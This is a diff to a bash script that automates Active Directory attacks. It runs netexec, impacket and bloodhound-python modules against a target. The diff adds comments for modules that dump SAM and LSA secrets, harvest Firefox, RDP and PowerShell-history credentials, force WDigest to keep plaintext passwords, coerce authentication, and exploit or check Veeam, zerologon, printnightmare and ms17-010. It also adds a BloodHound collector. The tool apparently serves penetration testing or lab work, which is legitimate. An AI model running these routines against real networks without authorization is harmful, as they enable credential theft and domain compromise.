@@ -301,6 +301,8 @@ EOF
 # ------------------------------------
 # Active Directory Enumeration
 # ------------------------------------
+
+# Use netexec smb module to enumerate the Active Directory using Kerberos
 execute_netexec_smb_kerberos() {
     if ! command -v netexec >/dev/null 2>&1; then
         log "ERROR" "netexec is not installed"
@@ -314,29 +316,32 @@ execute_netexec_smb_kerberos() {
 
     if [[ "$OPEN_PORTS" == *"88"* ]]; then
         MODULES=(
-            "--shares"
-            "--users"
-            "--groups"
-            "--pass-pol"
-            "--local-group"
-            "--rid-brute"
-            "--delegate Administrator"
-            "-M gpp_password"
-            "-M coerce_plus"
-            "-M enum_av"
-            "-M enum_ca"
-            "-M gpp_autologin"
-            "-M spooler"
-            "-M webdav"
-            "-M veeam"
-            "-M printnightmare"
-            "-M ms17-010"
-            "-M gpp_autologin"
-            "--sam"
-            "--lsa"
+            "--shares" # Get shares (low privs account)
+            "--users" # Get users (low privs account)
+            "--groups" # Get groups (low privs account)
+            "--pass-pol" # Get password policy (low privs account)
+            "--local-group" # Get local groups (low privs account)
+            "--rid-brute" # Get groups and users (low privs account)
+            "--delegate Administrator" #If you own a computer account try get local administrator with s4u2self extension
+            "-M gpp_password" # Identify/extract passwords in Group Policy Preferences (GPP) files via SMB shares in AD
+            "-M coerce_plus" # It attempts to force the target system to authenticate to a specified system
+            "-M enum_av" # Used to enumerate antivirus (AV) software on a AD system
+            "-M enum_ca" # Queries AD for CAs, with misconfigurations like vulnerable certificate templates.
+            "-M gpp_autologin" # Extract autologin credentials in Group Policy Preferences (GPP) in Active Directory.
+            "-M spooler" # Checks if AD is vulnerable to Print Spooler exploits.
+            "-M printnightmare" # Check for printnightmare
+            "-M webdav" # Checks for WebDAV vulnerabilities in AD.
+            "-M veeam" # Exploit Veeam Backup & Replication servers in AD.
+            "-M ms17-010" # Check for ms17-010
+            "-M gpp_autologin" # Check GPP for creds
+            "--sam" # Dump SAM passwords (High Priv)
+            "--lsa" # Dump LSA passwords (High Priv)
             "--user $USERNAME"
+            "-M firefox" # Get firefox creds.
+            "-M powershell_history" # Get powershell history.
+            "-M rdcman" # Get creds for RDP
+            "-M wdigest" # Forces WDigest to store credentials in plaintext (if enabled).
         )
-
         for mod in "${MODULES[@]}"; do
             CMD="netexec smb -k '$ADFQDN'"
             [[ -n "$USERNAME" && -n "$PASSWORD" && -n "$DOMAIN" ]] && CMD+=" -u '$USERNAME' -p '$PASSWORD' -d '$DOMAIN' --kdcHost '$KDCHOST'"
@@ -351,6 +356,7 @@ execute_netexec_smb_kerberos() {
     fi
 }
 
+# Use netexec smb module to enumerate the Active Directory using NTLM authentication
 execute_netexec_smb_ntlm() {
     if ! command -v netexec >/dev/null 2>&1; then
         log "ERROR" "netexec is not installed"
@@ -358,28 +364,31 @@ execute_netexec_smb_ntlm() {
     fi
     if [[ "$OPEN_PORTS" == *"445"* ]]; then
         MODULES=(
-            "--shares"
-            "--users"
-            "--groups"
-            "--pass-pol"
-            "--local-group"
-            "--rid-brute"
-            "--delegate Administrator"
-            "-M gpp_password"
-            "-M coerce_plus"
-            "-M enum_av"
-            "-M enum_ca"
-            "-M gpp_autologin"
-            "-M spooler"
-            "-M webdav"
-            "-M veeam"
-            "-M zerologon"
-            "-M printnightmare"
-            "-M ms17-010"
-            "-M gpp_autologin"
-            "--sam"
-            "--lsa"
+            "--shares" # Get shares (low privs account)
+            "--users" # Get users (low privs account)
+            "--groups" # Get groups (low privs account)
+            "--pass-pol" # Get password policy (low privs account)
+            "--local-group" # Get local groups (low privs account)
+            "--rid-brute" # Get groups and users (low privs account)
+            "--delegate Administrator" #If you own a computer account try get local administrator with s4u2self extension
+            "-M gpp_password" # Identify/extract passwords in Group Policy Preferences (GPP) files via SMB shares in AD
+            "-M coerce_plus" # It attempts to force the target system to authenticate to a specified system
+            "-M enum_av" # Used to enumerate antivirus (AV) software on a AD system
+            "-M enum_ca" # Queries AD for CAs, with misconfigurations like vulnerable certificate templates.
+            "-M gpp_autologin" # Extract autologin credentials in Group Policy Preferences (GPP) in Active Directory.
+            "-M spooler" # Checks if AD is vulnerable to Print Spooler exploits.
+            "-M printnightmare" # Check for printnightmare
+            "-M webdav" # Checks for WebDAV vulnerabilities in AD.
+            "-M veeam" # Exploit Veeam Backup & Replication servers in AD.
+            "-M ms17-010" # Check for ms17-010
+            "-M gpp_autologin" # Check GPP for creds
+            "--sam" # Dump SAM passwords (High Priv)
+            "--lsa" # Dump LSA passwords (High Priv)
             "--user $USERNAME"
+            "-M firefox" # Get firefox creds.
+            "-M powershell_history" # Get powershell history.
+            "-M rdcman" # Get creds for RDP
+            "-M wdigest" # Forces WDigest to store credentials in plaintext (if enabled).
         )
         for mod in "${MODULES[@]}"; do
             CMD="netexec smb '$IP'"
@@ -393,6 +402,7 @@ execute_netexec_smb_ntlm() {
     fi
 }
 
+# Use netexec ldap module to enumerate the Active Directory
 execute_netexec_ldap() {
     if ! command -v netexec >/dev/null 2>&1; then
         log "ERROR" "netexec is not installed"
@@ -400,18 +410,18 @@ execute_netexec_ldap() {
     fi
     if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"636"* ]]; then
         MODULES=(
-            "-M adcs"
+            "-M adcs" # Check for certificate authorities
             "-M enum_trusts"
-            "-M get-desc-users"
+            "-M get-desc-users" # Search for passwords in user description (low priv)
             "-M get-network"
-            "-M get-unixUserPassword"
-            "-M get-userPassword"
+            "-M get-unixUserPassword" # Search for passwords unix joined systems
+            "-M get-userPassword" # Search for passwords 
             "-M groupmembership -o USER=$USERNAME"
-            "-M laps"
+            "-M laps" # Check for LAPS READ policy
             "-M ldap-checker"
-            "-M pso"
+            "-M pso" # Get password policy and spray
             "-M subnets"
-            "-M user-desc"
+            "-M user-desc" # Search for passwords in user description (low priv)
             "-M whoami"
             "-M daclread -o TARGET=Administrator ACTION=read"
         )
@@ -427,6 +437,7 @@ execute_netexec_ldap() {
     fi
 }
 
+# Use netexec winrm module to enumerate the Active Directory
 execute_netexec_winrm() {
     if ! command -v netexec >/dev/null 2>&1; then
         log "ERROR" "netexec is not installed"
@@ -446,6 +457,7 @@ execute_netexec_winrm() {
     fi
 }
 
+# Use netexec mssql module to enumerate the Active Directory
 execute_netexec_mssql() {
     if ! command -v netexec >/dev/null 2>&1; then
         log "ERROR" "netexec is not installed"
@@ -472,6 +484,7 @@ execute_netexec_mssql() {
     fi
 }
 
+# Use netexec ssh module to enumerate the Active Directory
 execute_netexec_ssh() {
     if ! command -v netexec >/dev/null 2>&1; then
         log "ERROR" "netexec is not installed"
@@ -495,6 +508,7 @@ execute_netexec_ssh() {
     fi
 }
 
+# Use netexec ftp module to enumerate the Active Directory
 execute_netexec_ftp() {
     if ! command -v netexec >/dev/null 2>&1; then
         log "ERROR" "netexec is not installed"
@@ -518,6 +532,7 @@ execute_netexec_ftp() {
     fi
 }
 
+# Use enum4linux to enumerate the Active Directory (This is for old version for AD 2019 and upwards is not going to work)
 execute_enum4linux() {
     if ! command -v enum4linux >/dev/null 2>&1; then
         log "ERROR" "enum4linux is not installed"
@@ -537,6 +552,7 @@ execute_enum4linux() {
     fi
 }
 
+# Use enum4linux-ng to enumerate the Active Directory (This is for newer versions of AD)
 execute_enum4linux-ng() {
     if ! command -v enum4linux-ng >/dev/null 2>&1; then
         log "ERROR" "enum4linux-ng is not installed"
@@ -556,6 +572,7 @@ execute_enum4linux-ng() {
     fi
 }
 
+# Use impacket-GetUserSPNs to enumerate the Active Directory
 execute_impacket_getuserspns() {
     if ! command -v impacket-GetUserSPNs >/dev/null 2>&1; then
         log "ERROR" "impacket-GetUserSPNs is not installed"
@@ -570,6 +587,7 @@ execute_impacket_getuserspns() {
     fi
 }
 
+# Use impacket-getTGT to get ticket for Active Directory
 execute_impacket_getTGT() {
     if ! command -v impacket-getTGT >/dev/null 2>&1; then
         log "ERROR" "impacket-getTGT is not installed"
@@ -584,6 +602,22 @@ execute_impacket_getTGT() {
     fi
 }
 
+# Use bloodhound remote collector for analysis of permissions
+execute_bloodhound_python() {
+    if ! command -v bloodhound-python >/dev/null 2>&1; then
+        log "ERROR" "bloodhound-python is not installed"
+        return
+    fi
+    if [[ "$OPEN_PORTS" == *"389"* || "$OPEN_PORTS" == *"445"* || "$OPEN_PORTS" == *"88"* ]]; then
+        CMD="bloodhound-python -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' -c All -dc $ADFQDN -ns $IP -gc $ADFQDN"
+        log "INFO" "Executing: $CMD"
+        OUT=$(eval "$CMD" 2>&1)
+        echo "$OUT" >> "$OUTPUT_DIR/bloodhound_python.output"
+        append_to_report "bloodhound-python" "$OUT"
+    fi
+}
+
+# Use ldapsearch for AD enumeration
 execute_ldapsearch() {
     if ! command -v ldapsearch >/dev/null 2>&1; then
         log "ERROR" "ldapsearch is not installed"
@@ -637,6 +671,7 @@ main() {
     execute_ldapsearch
     execute_impacket_getuserspns
     execute_impacket_getTGT
+    execute_bloodhound_python
 }
 
 main "$@"
